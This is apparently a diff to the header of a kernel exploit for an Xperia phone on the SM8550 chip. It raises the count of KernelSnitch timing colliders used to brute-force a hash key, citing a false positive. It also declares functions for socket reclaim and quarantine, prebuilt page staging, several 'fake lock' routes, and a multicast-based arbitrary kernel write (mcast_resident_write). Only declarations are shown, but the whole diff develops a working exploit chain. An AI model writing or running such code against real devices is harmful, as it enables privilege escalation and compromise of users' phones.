@@ -56,7 +56,10 @@ extern int g_core_main;
 extern int g_core_consumer;
 #define CORE (g_core_main)
 #define CONSUMER_CORE (g_core_consumer)
-#define KSNITCH_COLLISIONS 4
+/* Four timing-derived colliders produced a hash false positive in an unmapped
+ * Xperia direct-map hole. Eight keeps the brute-force key selective while
+ * remaining practical on the eight-core SM8550. */
+#define KSNITCH_COLLISIONS 8
 
 #define ORDER3_SIZE (PAGE_SIZE << MM_ORDER)
 #define SKB_SEND_SIZE (ORDER3_SIZE * 2)
@@ -179,6 +182,11 @@ pid_t clone_leak_child(void);
 int open_memfd(pid_t child);
 void kill_child(pid_t child);
 void close_reclaim_sockets(void);
+int quarantine_reclaim_sockets(void);
+void release_quarantined_reclaim_sockets(void);
+int stash_prebuilt_page(void);
+int activate_prebuilt_page(void);
+void discard_prebuilt_page(void);
 void setup_kernelsnitch(void);
 int kernelsnitch_collisions_ready(void);
 void run_kernelsnitch_bruteforce(void);
@@ -202,6 +210,10 @@ void reserve_standard_io(void);
 void prepare_pselect_fdsets(fd_set *in, fd_set *out, fd_set *ex);
 void do_pselect_fake_lock_route(void);
 void do_tcp_fake_lock_route(void);
+void do_mcast_fake_lock_route(void);
+int mcast_resident_start(void);
+int mcast_resident_write(uintptr_t target, uintptr_t value);
+void mcast_resident_stop(void);
 void reset_main_route_state(void);
 int run_main_route_threads(void);
 void set_pselect_write_mode(uintptr_t target, int mode);
